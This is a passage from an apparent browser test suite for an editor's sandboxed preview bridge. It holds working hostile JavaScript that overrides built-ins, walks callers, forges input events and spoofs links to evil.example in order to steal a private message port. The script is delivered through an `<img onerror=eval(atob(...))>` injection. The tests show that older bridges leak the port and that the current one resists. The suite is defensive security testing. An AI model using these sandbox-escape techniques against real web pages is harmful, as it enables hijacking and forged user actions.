if(V==='messageevent'){['data','ports','source','origin','lastEventId'].forEach(function(n){getter(MessageEvent.prototype,n)})}
if(V==='event'){['target','currentTarget','srcElement','defaultPrevented','type','eventPhase','bubbles'].forEach(function(n){getter(Event.prototype,n)});['stopImmediatePropagation','stopPropagation','preventDefault','composedPath'].forEach(function(n){method(Event.prototype,n)})}
if(V==='eventtarget'){['addEventListener','removeEventListener','dispatchEvent'].forEach(function(n){method(EventTarget.prototype,n)})}
if(V==='messageport'){['postMessage','start','close','addEventListener'].forEach(function(n){method(MPp,n)});getter(MPp,'onmessage')}
if(V==='function'){method(Reflect,'apply');method(Reflect,'construct');method(Function.prototype,'bind');method(Function.prototype,'apply');method(Function.prototype,'call')}
if(V==='object'){['freeze','getOwnPropertyDescriptor','defineProperty','keys','assign'].forEach(function(n){method(Object,n)});method(JSON,'stringify');method(JSON,'parse');
['diff','line','top','then','channel','html','handleEvent'].forEach(function(n){DP0(Object.prototype,n,{configurable:true,get:function(){hit(this);return undefined}})})}
if(V==='hooks')hooks();
if(V==='timers'){Date.now=function(){return -1e9+10};method(window,'setTimeout');method(window,'clearTimeout');method(window,'requestAnimationFrame');method(window,'queueMicrotask');
var y=0;oSI(function(){y=(y+37)%400;(document.scrollingElement||document.documentElement).scrollTop=y},40)}
if(V==='keys'){var fk=function(n,v){DP0(KeyboardEvent.prototype,n,{configurable:true,get:function(){hit(this);return v}})};fk('key','s');fk('metaKey',true);fk('ctrlKey',true);fk('altKey',false);fk('shiftKey',false);
DP0(MouseEvent.prototype,'buttons',{configurable:true,get:function(){hit(this);return 1}});var fake=document.createElement('a');fake.setAttribute('href','https://evil.example/click');
var oc=Element.prototype.closest;Element.prototype.closest=function(){hit(this,arguments);return fake};var og=Element.prototype.getAttribute;Element.prototype.getAttribute=function(n){hit(this,arguments);return n==='href'?'https://evil.example/click':RA0(og,this,arguments)};
getter(Event.prototype,'target');getter(Event.prototype,'defaultPrevented')}
if(V==='mutation')new MutationObserver(function(){hit(null)}).observe(document.documentElement,{subtree:true,childList:true,characterData:true,attributes:true});
if(V==='string'){var S0=String;window.String=function(x){hit(null,arguments);return S0(x)}}
if(V==='replace')method(String.prototype,'replace');
if(V==='ce')customElements.define('x-y',class extends HTMLElement{connectedCallback(){hit(null)}});
if(V==='scrolling')getter(Document.prototype,'scrollingElement');
if(V==='innerhtml'){getter(Element.prototype,'innerHTML');getter(HTMLTemplateElement.prototype,'content')}
if(V==='synthetic'){var a=document.createElement('a');a.setAttribute('href','https://evil.example/synthetic');a.textContent='x';document.body.appendChild(a);
window.__api0=window.__orzPreview;try{window.__orzPreview={report:function(){},post:function(){},navigated:function(){}}}catch(e){}try{window.__api0.navigated=function(){}}catch(e){}try{window.__orzLibsReady=function(){}}catch(e){}
var ev=function(t,e){try{t.dispatchEvent(e)}catch(x){}};
oSI(function(){var ks=['s','p','\\','Escape'];for(var i=0;i<ks.length;i++)ev(document.body,new KeyboardEvent('keydown',{key:ks[i],metaKey:true,ctrlKey:true,bubbles:true,cancelable:true}));
ev(document.body,new PointerEvent('pointerdown',{bubbles:true}));ev(document.body,new WheelEvent('wheel',{bubbles:true}));ev(document.body,new PointerEvent('pointermove',{bubbles:true,buttons:1}));
try{ev(document.body,new TouchEvent('touchstart',{bubbles:true}))}catch(x){}ev(a,new MouseEvent('click',{bubbles:true,cancelable:true}));
try{window.__orzPreview.navigated(40)}catch(x){}window.__hits++;(document.scrollingElement||document.documentElement).scrollTop=(window.__hits*37)%400},100)}
})`;
  const OLD_BRIDGE = readFileSync('tests/fixtures/preview-bridge-2.3.0-round2.js', 'utf8').trim();
  /** The round-3 bridge (2.3.0 round 3): every native captured, but the port's message handled inside its listener (window.event). */
  const ROUND3_BRIDGE = readFileSync('tests/fixtures/preview-bridge-2.3.0-round3.js', 'utf8').trim();
  const attackText = (v: string, id: string) => `{{nyml\nkind: document\nuid: doc-${`attack${id}`.padEnd(16, '0')}\n}}\n\n# Attack ${v}\n\n<img src="x" onerror="eval(atob('${Buffer.from(`${ATTACK}(${JSON.stringify(v)})`).toString('base64')}'))">\n\n${Array.from({ length: 80 }, (_, i) => `Line ${i} of the attack.\n`).join('\n')}`;
  /** Mount a shell on a document running the attack `v`, make the shell post through the port, and report what reached the host. (Each new shell goes first in the page: a frame at the viewport's bottom edge gets no input in headless Chrome.) */
  const runAttack = async (p: Page, v: string, id: string, oldBridge: boolean | string = false) => {
    const old = oldBridge === true ? OLD_BRIDGE : oldBridge || '';
    await p.evaluate(`(function(id){var d=document.createElement('div');d.id=id;d.className='box';document.body.insertBefore(d,document.body.firstChild);scrollTo(0,0);window.__saved[id]=[];})(${JSON.stringify(id)})`);
    const opts = `{ print: true, links: true, preview: ${old ? `{ bridge: ${JSON.stringify(old)} }` : '{}'} }`;
    expect(await p.evaluate(`mountOpts(${JSON.stringify(id)}, ${JSON.stringify(attackText(v, id))}, ${JSON.stringify(`${A}/cm6.js`)}, ${opts})`)).toEqual({ engine: 'codemirror6', error: null });
    const f = await frameOf(p, `Attack ${v}`);
    await expect.poll(() => f.evaluate('window.__atk'), { timeout: 10_000 }).toBe(1);
    await p.evaluate(`(function(id){var s=window['shell_'+id];window['heard_'+id]=[];['orz-preview-key','orz-preview-link','orz-preview-scrolled','orz-preview-active'].forEach(function(t){s.preview.on(t,function(m){window['heard_'+id].push(m.type.slice(12)+':'+(m.key||m.href||m.input||m.line||m.top||''))})})})(${JSON.stringify(id)})`);
    const top0 = await p.evaluate(`shell_${id}.root.querySelector('.cm-scroller').scrollTop`);
    // the shell posts through the port: renders (and their acknowledgement), a carrier's message, a scroll
    for (let i = 0; i < 2; i++) {
      // (a custom element in each new paragraph: its connectedCallback runs when the bridge inserts it)
      await p.evaluate(`shell_${id}.setText(shell_${id}.getText() + "\\n\\nMore ${i}. <x-y>new</x-y>\\n")`);
      // (the round-2 bridge's stolen port switches the view away from the preview: no render then)
      if (old) await p.waitForTimeout(800);
      else await expect.poll(() => f.evaluate('document.getElementById("orz-doc").textContent.indexOf("More ' + i + '.") >= 0'), { timeout: 10_000 }).toBe(true);
      await p.evaluate(`shell_${id}.preview.post({ type: 'x-ping', n: ${i} })`);
    }
    if (v === 'keys' && !old) {
      // the reader's own plain click on text and a plain key in the frame: neither may become a save, a print or a link
      await p.locator(`#${id} iframe`).click({ position: { x: 300, y: 120 } });
      await p.keyboard.press('x');
    }
    await p.waitForTimeout(1200);
    return {
      frame: f,
      got: await f.evaluate('window.__got'),
      hits: Number(await f.evaluate('window.__hits')),
      saved: await p.evaluate(`window.__saved[${JSON.stringify(id)}].length`),
      prints: await p.evaluate(`(window.__prints || []).filter(function (x) { return x.indexOf(${JSON.stringify(`${id}:`)}) === 0; }).length + window.__printed`),
      links: await p.evaluate('window.__links.length'),
      mode: await p.evaluate(`shell_${id}.getMode()`),
      heard: (await p.evaluate(`window['heard_${id}']`)) as string[],
      moved: (await p.evaluate(`shell_${id}.root.querySelector('.cm-scroller').scrollTop`)) !== top0,
    };
  };

  it('[E.35] [E.14] a document script that overrides the built-ins the bridge uses (MessageEvent/Event getters, addEventListener, MessagePort methods, Function.prototype.call/apply/bind, Reflect.apply, Object/JSON functions, Object.prototype getters, the page hooks with a caller and stack walk, timers and Date.now, key/mouse getters and Element methods) never gets the private port: the shell\'s renders and messages through it go on, and nothing it forges saves, prints, switches the view, opens a link, scrolls the editor or reports input; the reader\'s plain click and key stay plain', { timeout: 240_000 }, async () => {
    const p = await open();
    await p.evaluate('window.__prints = []; window.__printed = 0; window.print = function () { window.__printed++; };');
    const variants = ['messageevent', 'event', 'eventtarget', 'messageport', 'function', 'object', 'hooks', 'timers', 'keys'];
    for (const [i, v] of variants.entries()) {
      const r = await runAttack(p, v, `v${i}`);
      const heard = v === 'keys' ? r.heard.filter((h) => !/^active:(pointer|key)$/.test(h)) : r.heard; // the reader's own click and key are input
      expect({ v, got: r.got, saved: r.saved, prints: r.prints, links: r.links, mode: r.mode, heard, moved: r.moved }).toEqual({ v, got: '', saved: 0, prints: 0, links: 0, mode: 'split', heard: [], moved: false });
      if (v === 'keys') expect(r.heard).toContain('active:key'); // the reader's key did reach the bridge (plain)
      if (v === 'hooks' || v === 'keys') expect(r.hits, v).toBeGreaterThan(0); // the override ran (the others: the bridge never calls them now)
    }
    await p.close();
  });

  it('[E.35] (2.3.0 round 4 of the paged loop) window.event never holds the port while document code runs: a MutationObserver, an overridden String / String.prototype.replace, a custom element\'s connectedCallback, the scrollingElement getter, the innerHTML setter and template content getter, Object.prototype getters and the page hooks — each runs during the bridge\'s render and reads window.event — never find the port; untrusted (script-dispatched) keys, clicks, pointer, wheel and touch events and __orzPreview.navigated without the reader\'s input report nothing; __orzPreview and __orzLibsReady are frozen, non-writable and non-configurable', { timeout: 240_000 }, async () => {
    const p = await open();
    await p.evaluate('window.__prints = []; window.__printed = 0; window.print = function () { window.__printed++; };');
    const variants = ['mutation', 'string', 'replace', 'ce', 'scrolling', 'innerhtml', 'object', 'hooks', 'synthetic'];
    for (const [i, v] of variants.entries()) {
      const r = await runAttack(p, v, `w${i}`);
      expect({ v, got: r.got, saved: r.saved, prints: r.prints, links: r.links, mode: r.mode, heard: r.heard, moved: r.moved }).toEqual({ v, got: '', saved: 0, prints: 0, links: 0, mode: 'split', heard: [], moved: false });
      expect(r.hits, v).toBeGreaterThan(0); // the document's code did run (during the render, or its synthetic events)
      if (v === 'synthetic') {
        const api = await r.frame.evaluate(`(function(){var d=Object.getOwnPropertyDescriptor(window,'__orzPreview'),l=Object.getOwnPropertyDescriptor(window,'__orzLibsReady'),o=window.__orzPreview;
          return {kept:o===window.__api0,frozen:[Object.isFrozen(o),Object.isFrozen(o.report),Object.isFrozen(o.post),Object.isFrozen(o.navigated),Object.isFrozen(window.__orzLibsReady)],writable:[d.writable,l.writable],configurable:[d.configurable,l.configurable]}})()`);
        expect(api).toEqual({ kept: true, frozen: [true, true, true, true, true], writable: [false, false], configurable: [false, false] });
      }
    }
    await p.close();
  });

  it('[E.35] the window.event attacks are real: the round-3 bridge (as a carrier\'s own bridge), which handled the port\'s message inside its listener, leaks the port through window.event to a MutationObserver, String, String.prototype.replace, a custom element, scrollingElement, innerHTML / template content, an Object.prototype getter and a page hook; the forged keys then save, print and switch the view, and the forged link arrives', { timeout: 240_000 }, async () => {
    const p = await open();
    await p.evaluate('window.__prints = []; window.__printed = 0; window.print = function () { window.__printed++; };');
    for (const [i, v] of ['mutation', 'string', 'replace', 'ce', 'scrolling', 'innerhtml', 'object', 'hooks'].entries()) {
      const r = await runAttack(p, v, `r3${i}`, ROUND3_BRIDGE);
      expect([v, r.got, r.saved > 0, r.prints > 0, r.links > 0 || r.heard.some((h) => h.startsWith('link:'))]).toEqual([v, '[port]', true, true, true]);
    }
    await p.close();
  });

  it('[E.35] the attacks are real: the round-2 bridge (as a carrier\'s own bridge) leaks the port to an overridden MessageEvent.prototype.data getter, and to a caller walk (fn.caller / fn.arguments) from a page hook, an overridden DOM method or a timer it calls; the forged keys then save, print and switch the view, and the forged link arrives', { timeout: 120_000 }, async () => {
    const p = await open();
    await p.evaluate('window.__prints = []; window.__printed = 0; window.print = function () { window.__printed++; };');
    // the overridden getter itself, a caller walk from a page hook, and a caller walk from any overridden DOM
    // getter or method (Element.prototype.getAttribute in the render) or timer the sloppy bridge calls
    for (const [i, v] of ['messageevent', 'hooks', 'keys', 'timers'].entries()) {
      const r = await runAttack(p, v, `old${i}`, true);
      expect([v, r.got, r.saved > 0, r.prints > 0, r.links > 0 || r.heard.some((h) => h.startsWith('link:'))]).toEqual([v, '[port]', true, true, true]);
    }
    await p.close();
  });

  it('[E.36] (2.3.0 round 3 of the paged loop) in a ~500 px column the toolbar wraps: a carrier\'s settings group in the tools slot, the view buttons, the status and Save all stay inside the bar, none overlaps another, and the bar has no horizontal overflow', async () => {
    const p = await open();
    await p.evaluate(`(function(){var d=document.createElement('div');d.id='narrow';d.style.cssText='width:500px;height:420px';document.body.insertBefore(d,document.body.firstChild);scrollTo(0,0);window.__saved.narrow=[];})()`);
    expect(await p.evaluate(`mountOpts('narrow', ${JSON.stringify(TEXT_B)}, ${JSON.stringify(`${A}/cm6.js`)})`)).toEqual({ engine: 'codemirror6', error: null });
    // a carrier's settings group (orz-paged: theme, page size, margins, fonts, version) and its AI menu
    await p.evaluate(`(function(){var t=shell_narrow.toolbar;['Theme: Classic','Page: A4','Margins: Normal','Font: Serif','Version: Full','AI'].forEach(function(l){var b=document.createElement('button');b.className='orz-btn orz-btn--ghost';b.textContent=l;t.appendChild(b)})})()`);
    await p.waitForTimeout(100);
    const r = (await p.evaluate(`(function(){
      var root=shell_narrow.root,bar=root.querySelector('.orz-editor__bar'),br=bar.getBoundingClientRect(),boxes=[],out=[],overlap=[];
      root.querySelectorAll('.orz-editor__bar button, .orz-editor__status').forEach(function(e){var r=e.getBoundingClientRect();if(!r.width||!r.height)return;boxes.push([e.textContent,r]);
        if(r.left<br.left-0.5||r.right>br.right+0.5||r.top<br.top-0.5||r.bottom>br.bottom+0.5)out.push(e.textContent)});
      for(var i=0;i<boxes.length;i++)for(var j=i+1;j<boxes.length;j++){var a=boxes[i][1],b=boxes[j][1];if(a.left<b.right-0.5&&b.left<a.right-0.5&&a.top<b.bottom-0.5&&b.top<a.bottom-0.5)overlap.push(boxes[i][0]+' / '+boxes[j][0])}
      return {n:boxes.length,out:out,overlap:overlap,scroll:bar.scrollWidth-bar.clientWidth,width:Math.round(br.width),tall:br.height>50};
    })()`)) as Record<string, unknown>;
    expect(r).toEqual({ n: 10, out: [], overlap: [], scroll: 0, width: 500, tall: true });
    await p.close();
  });

  it('[E.37] (2.3.0 round 3 of the paged loop) printDocument(html) prints the document in a hidden sandboxed frame (allow-scripts allow-modals, never allow-same-origin): the frame waits for the document\'s __orzPrintReady, calls its own print() — not the page\'s —, cannot reach the page, and goes away after; under a nonce policy it needs the nonce, and without it resolves false', { timeout: 60_000 }, async () => {
    // the document records its own print() (headless Chrome shows no dialog): what it saw, and whether it could reach the page
    const STUB = "window.print = function () { var r; try { r = String(parent.document.title); } catch (e) { r = e.name; } parent.postMessage({ probe: { kind: 'print', ready: document.body && document.body.getAttribute('data-ready'), title: document.title, reach: r } }, '*'); };";
    const DOC = `<!doctype html><html><head><title>Doc to print</title><script>${STUB}</script></head><body><h1>Pages</h1><script>window.__orzPrintReady=new Promise(function(r){setTimeout(function(){document.body.setAttribute("data-ready","laid out");r()},400)})</script></body></html>`;
    const p = await open();
    await p.evaluate('window.__printed = 0; window.print = function () { window.__printed++; };');
    const run = await p.evaluate(`(function(){var pr=OrzEditor.printDocument(${JSON.stringify(DOC)});var f=document.querySelector('iframe[data-orz-print]');var attrs=[f.getAttribute('sandbox'),f.getAttribute('aria-hidden'),f.getAttribute('tabindex')];return pr.then(function(ok){return {ok:ok,attrs:attrs,still:document.querySelectorAll('iframe[data-orz-print]').length}})})()`);
    expect(run).toEqual({ ok: true, attrs: ['allow-scripts allow-modals', 'true', '-1'], still: 1 });
    const probes = (await p.evaluate('window.__probes')) as Array<Record<string, unknown>>;
    expect(probes.filter((x) => x.kind === 'print')).toEqual([{ kind: 'print', ready: 'laid out', title: 'Doc to print', reach: 'SecurityError' }]);
    expect(await p.evaluate('window.__printed')).toBe(0);
    await expect.poll(() => p.evaluate("document.querySelectorAll('iframe[data-orz-print]').length"), { timeout: 5000 }).toBe(0);
    // round 4 (K11): the frame's messages count only with the call's token — a done (or start) without it, or with
    // another token, posted by the document at once, does not end the call before the document has printed
    const FORGE = "['orz-print-start','orz-print-done'].forEach(function(t){parent.postMessage({type:t},'*');parent.postMessage({type:t,token:'guess'},'*')});";
    const DOC2 = DOC.replace('<h1>Pages</h1>', `<h1>Pages</h1><script>${FORGE}</script>`).replace('Doc to print', 'Doc with forged done');
    await p.evaluate('window.__probes = []');
    expect(await p.evaluate(`OrzEditor.printDocument(${JSON.stringify(DOC2)}).then(function(ok){return [ok, window.__probes.map(function(x){return x.ready+'/'+x.title})]})`)).toEqual([true, ['laid out/Doc with forged done']]);
    await p.close();
    // a nonce Content-Security-Policy: the frame inherits it
    const q = await browser!.newPage({ viewport: { width: 1200, height: 900 } });
    await q.goto(`${A}/csp`);
    await expect.poll(() => q.evaluate('typeof window.OrzEditor')).toBe('object');
    const plain = `<!doctype html><html><head><title>Static</title><script nonce="abc">${STUB}</script></head><body><p>Its own script carries the nonce.</p></body></html>`;
    expect(await q.evaluate(`OrzEditor.printDocument(${JSON.stringify(plain)}, { nonce: 'abc' })`)).toBe(true);
    expect(((await q.evaluate('window.__probes || []')) as Array<Record<string, unknown>>).map((x) => x.title)).toEqual(['Static']);
    expect(await q.evaluate(`OrzEditor.printDocument(${JSON.stringify(plain)}, { readyTimeoutMs: 0 })`)).toBe(false);
    await q.close();
  });

  it('[E.13] [E.15] the incremental preview survives a line inserted above: nodes below are kept (their data-src-line updated), a drawn diagram is not redrawn; with diff: false every render replaces the content and keeps the scroll position', async () => {
    const T = `# Diff\n\nPara one.\n\nPara two.\n\n<div class="stub">diagram source</div>\n\nPara three.\n\n${Array.from({ length: 60 }, (_, i) => `Tail ${i}.\n`).join('\n')}`;
    const p = await open();
    await p.evaluate(`Promise.all([mountOpts('a', ${JSON.stringify(T)}, ${JSON.stringify(`${A}/cm6.js`)}), mountOpts('b', ${JSON.stringify(T)}, ${JSON.stringify(`${A}/cm6.js`)}, { preview: { diff: false } })])`);
    const fa = await frameOf(p, 'Tail 59.');
    const mark = `(function () {
      var art = document.getElementById('orz-doc');
      [].forEach.call(art.childNodes, function (n) { n.__kept = 1; });
      var stub = art.querySelector('.stub'); stub.innerHTML = '<svg id="drawn"></svg>';
      return art.querySelector('p:last-of-type').getAttribute('data-src-line');
    })()`;
    const lastLine = Number(await fa.evaluate(mark));
    // one Enter (and a line) after "Para one." — every block below moves down by two lines
    await p.evaluate('shell_a.setText(shell_a.getText().replace("Para one.\\n", "Para one.\\n\\nInserted.\\n"))');
    await expect.poll(() => fa.evaluate('document.getElementById("orz-doc").textContent.indexOf("Inserted.") >= 0'), { timeout: 5000 }).toBe(true);
    const after = (await fa.evaluate(`(function () {
      var art = document.getElementById('orz-doc'), kids = [].slice.call(art.children);
      var i = kids.findIndex(function (n) { return n.textContent === 'Inserted.'; });
      return { above: kids.slice(0, i).every(function (n) { return n.__kept; }), inserted: !kids[i].__kept, below: kids.slice(i + 1).every(function (n) { return n.__kept; }),
        drawn: !!art.querySelector('.stub #drawn'), last: art.querySelector('p:last-of-type').getAttribute('data-src-line') };
    })()`)) as Record<string, unknown>;
    expect(after).toEqual({ above: true, inserted: true, below: true, drawn: true, last: String(lastLine + 2) });
    // diff: false (shell b)
    const fb = (await (async () => { for (const f of p.frames()) { if (f !== p.mainFrame() && f !== fa && String(await f.evaluate('document.getElementById("orz-doc") ? document.getElementById("orz-doc").textContent : ""').catch(() => '')).includes('Tail 59.')) return f; } return null; })())!;
    await p.evaluate('shell_b.root.querySelector(".orz-editor__sync").click()'); // scroll sync off: the frame keeps its own position
    expect(await p.evaluate('shell_b.root.querySelector(".orz-editor__sync").getAttribute("aria-pressed")')).toBe('false');
    await fb.evaluate(`(function () { [].forEach.call(document.getElementById('orz-doc').childNodes, function (n) { n.__kept = 1; }); (document.scrollingElement || document.documentElement).scrollTop = 600; })()`);
    const y0 = Number(await fb.evaluate('(document.scrollingElement || document.documentElement).scrollTop'));
    expect(y0).toBeGreaterThan(500);
    await p.evaluate('shell_b.setText(shell_b.getText().replace("Tail 59.", "Tail 59 changed."))');
    await expect.poll(() => fb.evaluate('document.getElementById("orz-doc").textContent.indexOf("Tail 59 changed.") >= 0'), { timeout: 5000 }).toBe(true);
    expect(await fb.evaluate('[].some.call(document.getElementById("orz-doc").childNodes, function (n) { return n.__kept; })')).toBe(false);
    expect(Math.abs(Number(await fb.evaluate('(document.scrollingElement || document.documentElement).scrollTop')) - y0)).toBeLessThanOrEqual(1);
    await p.close();
  });

  it('[E.13] [E.19] under a nonce Content-Security-Policy the preview runs with preview.nonce; without it the frame never starts, which is an error (render) and a quiet notice instead of a blank pane', async () => {
    const p = await browser!.newPage({ viewport: { width: 1200, height: 1400 } });
    await p.goto(`${A}/csp`);
    await expect.poll(() => p.evaluate('typeof window.mountOpts')).toBe('function'); // (waitForFunction needs eval, which this CSP forbids)
    await p.evaluate(`Promise.all([mountOpts('a', '# With nonce\\n\\nshown\\n', ${JSON.stringify(`${A}/cm6.js`)}, { preview: { nonce: 'abc' } }), mountOpts('b', '# Without\\n\\nblocked\\n', ${JSON.stringify(`${A}/cm6.js`)}, { preview: { readyTimeoutMs: 1500 } })])`);
    await frameOf(p, 'shown');
    await expect.poll(() => p.evaluate('errors_b.length'), { timeout: 5000 }).toBeGreaterThan(0);
    expect(await p.evaluate('errors_b[0]')).toMatch(/^render: The preview frame did not start/);
    expect(await p.evaluate('shell_b.root.querySelector(".orz-editor__preview-note").textContent')).toBe('The preview could not start on this page.');
    expect(await p.evaluate('[errors_a.length, shell_a.root.querySelector(".orz-editor__preview-note")]')).toEqual([0, null]);
    await p.close();
  });

  it('[E.19] (2.5.0, STATUS D-80) a frame a policy blocks is reported a moment after it loads, not after the 8 s ready timeout, and the error names what an embedder has: the nonce option and this frame\'s own script hashes — which, added to script-src, let the preview start', async () => {
    const p = await browser!.newPage({ viewport: { width: 1200, height: 1400 } });
    await p.goto(`${A}/csp`);
    await expect.poll(() => p.evaluate('typeof window.mountOpts')).toBe('function');
    const t0 = Date.now();
    await p.evaluate(`mountOpts('a', '# Blocked\\n\\ntext\\n', ${JSON.stringify(`${A}/cm6.js`)})`);
    await expect.poll(() => p.evaluate('errors_a.length'), { timeout: 4000, intervals: [50] }).toBeGreaterThan(0);
    expect(Date.now() - t0).toBeLessThan(4000); // was PREVIEW_READY_TIMEOUT_MS (8 s), more after a theme change
    const message = String(await p.evaluate('errors_a[0]'));
    expect(message).toMatch(/^render: The preview frame did not start: this page's Content-Security-Policy most likely blocks its inline scripts\. Give the editor the page's CSP nonce \(the nonce option of createEditorShell, or of a carrier's mountEditor\), or allow its scripts by adding '(sha256-[A-Za-z0-9+/=]+)'( 'sha256-[A-Za-z0-9+/=]+')* to script-src\.$/);
    expect(message).not.toMatch(/preview\.nonce|PREVIEW_BRIDGE_HASH/);
    const hashes = message.match(/'sha256-[A-Za-z0-9+/=]+'/g)!;
    expect(hashes).toContain(`'${PREVIEW_BRIDGE_HASH}'`);
    expect(await p.evaluate('shell_a.root.querySelector(".orz-editor__preview-note").textContent')).toBe('The preview could not start on this page.');
    await p.close();
    // the hashes it named are enough: the same editor under a policy that allows just them starts
    const q = await browser!.newPage({ viewport: { width: 1200, height: 1400 } });
    await q.goto(`${A}/csp-hash?h=${encodeURIComponent(hashes.join(' '))}`);
    await expect.poll(() => q.evaluate('typeof window.mountOpts')).toBe('function');
    await q.evaluate(`mountOpts('a', '# Allowed by hash\\n\\nhashok\\n', ${JSON.stringify(`${A}/cm6.js`)})`);
    await frameOf(q, 'hashok');
    await q.waitForTimeout(1500);
    expect(await q.evaluate('errors_a')).toEqual([]);
    await q.close();
  });

  it('[E.25] (2.5.0, STATUS D-100) a theme change never flashes: while the rebuilt frame loads its (slow) stylesheet, the previous frame keeps showing the document over it; the new one is shown only once it has drawn the document with its theme, and then it is the only frame', async () => {
    const p = await open();
    expect(await p.evaluate(`mountOpts('a', '# Theme flash\\n\\nmarker-d100\\n', ${JSON.stringify(`${A}/cm6.js`)}, { preview: { head: '<link rel="stylesheet" href="${A}/slow-theme-light.css">' } })`)).toEqual({ engine: 'codemirror6', error: null });
    await frameOf(p, 'marker-d100');
    expect(await p.evaluate('shell_a.root.querySelectorAll("iframe").length')).toBe(1);
    /** What the reader sees: the top frame (the picture while there is one) — its text and its body colour. */
    const seen = async (retry = 3): Promise<[number, string, string]> => {
      const list = await p.evaluateHandle('shell_a.root.querySelectorAll("iframe")');
      const n = Number(await list.evaluate((l: NodeListOf<HTMLIFrameElement>) => l.length));
      const top = (await list.evaluateHandle((l: NodeListOf<HTMLIFrameElement>) => l[0])).asElement()!;
      const f = await top.contentFrame();
      const [text, bg] = f ? await f.evaluate('[document.getElementById("orz-doc") ? document.getElementById("orz-doc").textContent : "", getComputedStyle(document.body).backgroundColor]').catch(() => ['', '']) as [string, string] : ['', ''];
      // the picture went between the two reads (its frame detached): look again
      if (text === '' && bg === '' && retry > 0) return seen(retry - 1);
      return [n, text, bg];
    };
    await expect.poll(async () => (await seen())[2], { timeout: 5000 }).toBe('rgb(250, 250, 240)'); // the first theme has arrived
    await p.evaluate(`shell_a.preview.setOptions({ head: '<link rel="stylesheet" href="${A}/slow-theme-dark.css">', scheme: 'dark' })`);
    const samples: Array<[number, string, string]> = [];
    const t0 = Date.now();
    while (Date.now() - t0 < 2500) { samples.push(await seen()); await p.waitForTimeout(25); }
    // every sample shows the document: the light picture first, then the drawn dark frame — never an empty or unstyled one
    for (const [n, text, bg] of samples) {
      expect(text).toContain('marker-d100');
      expect([n, bg]).toContainEqual(n === 2 ? 'rgb(250, 250, 240)' : 'rgb(20, 20, 30)');
    }
    expect(samples[0][0]).toBe(2);
    expect(samples.at(-1)).toEqual([1, expect.stringContaining('marker-d100'), 'rgb(20, 20, 30)']);
    // the live frame takes renders and the shell's keys as before
    await p.evaluate(`shell_a.setText('# Theme flash\\n\\nafter-d100\\n')`);
    await frameOf(p, 'after-d100');
    await p.close();
  });

  it('[E.13] [E.21] [E.9] typing and a header edit made while CodeMirror loads carry over: CodeMirror starts from the textarea\'s current text with one undo step per textarea step; setText right after typing is its own undo step', async () => {
    const T = '# T\r\n\r\nx\r\n';
    const p = await open();
    await p.evaluate(`void (window.__r = mountOpts('c', ${JSON.stringify(T)}, ${JSON.stringify(`${A}/cm6-slow.js`)}))`);
    await p.evaluate('shell_c.setHeader({ title: "Set early" })');
    const headed = editHeader(T, { title: 'Set early' });
    await p.locator('#c textarea').click();
    await p.locator('#c textarea').evaluate((ta) => { const t = ta as HTMLTextAreaElement; t.setSelectionRange(t.value.length, t.value.length); });
    await p.keyboard.type('during load');
    expect(await p.evaluate('shell_c.adapter.name')).toBe('textarea');
    expect(await p.evaluate('window.__r')).toEqual({ engine: 'codemirror6', error: null });
    expect(await p.evaluate('shell_c.getText()')).toBe(`${headed}during load`);
    expect(await p.evaluate('[shell_c.undo(), shell_c.getText()]')).toEqual([true, headed]);
    expect(await p.evaluate('[shell_c.undo(), shell_c.getText()]')).toEqual([true, T]);
    expect(await p.evaluate('shell_c.undo()')).toBe(false);
    expect(await p.evaluate('[shell_c.redo(), shell_c.redo(), shell_c.getText()]')).toEqual([true, true, `${headed}during load`]);
    // E13: typing, then setText at once: one undo removes only the setText
    await p.locator('#c .cm-content').click();
    await p.keyboard.press('ControlOrMeta+End');
    await p.keyboard.type('typed');
    const typed = await p.evaluate('shell_c.getText()') as string;
    await p.evaluate('shell_c.setText(shell_c.getText() + "X")');
    expect(await p.evaluate('[shell_c.undo(), shell_c.getText()]')).toEqual([true, typed]);
    await p.close();
  });

  it('[E.13] [E.21] a 1.25 MB CR LF document in the textarea engine: a keystroke in the shell costs about what it costs in a bare textarea', async () => {
    const big = readFileSync('tests/carrier-corpus/md/large.md', 'utf8').repeat(12).replace(/\r?\n/g, '\r\n');
    expect(big.length).toBeGreaterThan(1_200_000);
    const p = await open();
    const perKey = async (mode: string) => {
      await p.evaluate(`(function (t, mode) {
        var a = document.getElementById('c'); a.innerHTML = '';
        if (mode === 'bare') { var ta = document.createElement('textarea'); ta.style.cssText = 'width:900px;height:400px'; ta.value = t; a.append(ta); ta.addEventListener('input', function () { window.__v = ta.value; }); }
        else window.shell_c = OrzEditor.createEditorShell(a, { text: t, render: function () { return ''; }, adapter: OrzEditor.textareaAdapter(), hooks: { save: function () { return Promise.resolve(); } }, mode: 'editor' });
      })(${JSON.stringify(big)}, ${JSON.stringify(mode)})`);
      await p.locator('#c textarea').first().click();
      await p.locator('#c textarea').first().evaluate((ta) => { const t = ta as HTMLTextAreaElement; t.setSelectionRange(t.value.length, t.value.length); });
      await p.keyboard.press('Backspace');
      const t0 = Date.now();
      for (let i = 0; i < 12; i++) await p.keyboard.press('Backspace');
      return (Date.now() - t0) / 12;
    };
    const bare = await perKey('bare');
    const shell = await perKey('shell');
    expect(shell / bare).toBeLessThan(1.6);
    expect(await p.evaluate('shell_c.getText()')).toBe(toEditorText(big).slice(0, -13).replace(/\n/g, '\r\n'));
    await p.close();
  }, 60_000);

  it('[E.13] [E.23] a scroll event dispatched between a keystroke\'s DOM change and CodeMirror\'s read of it (Chrome revealing the caret under load) keeps every keystroke in order: CodeMirror reads the live selection, not the one before the key', async () => {
    const T = '# S\r\n\r\nfirst\r\n';
    const p = await open();
    expect(await p.evaluate(`mountOpts('c', ${JSON.stringify(T)}, ${JSON.stringify(`${A}/cm6.js`)})`)).toEqual({ engine: 'codemirror6', error: null });
    // One task, no microtask checkpoint between the insertions and the scroll events: the mutation
    // observer has not run when CodeMirror's scroll handler reads the change. Targets: the scroller
    // (inside the shadow root), the window, the shadow host (a light-DOM scroll parent).
    const ok = await p.evaluate(`(function () {
      var view = OrzCodeMirror6.view.EditorView.findFromDOM(shell_c.root.querySelector('.cm-editor'));
      view.focus();
      view.dispatch({ selection: { anchor: view.state.doc.length } });
      var targets = [view.scrollDOM, window, document.getElementById('c'), document];
      var s = 'Second line', ok = true;
      for (var i = 0; i < s.length; i++) {
        ok = document.execCommand('insertText', false, s[i]) && ok;
        targets[i % targets.length].dispatchEvent(new Event('scroll'));
      }
      return ok;
    })()`);
    expect(ok).toBe(true);
    await expect.poll(() => p.evaluate('shell_c.getText()')).toBe(`${T}Second line`);
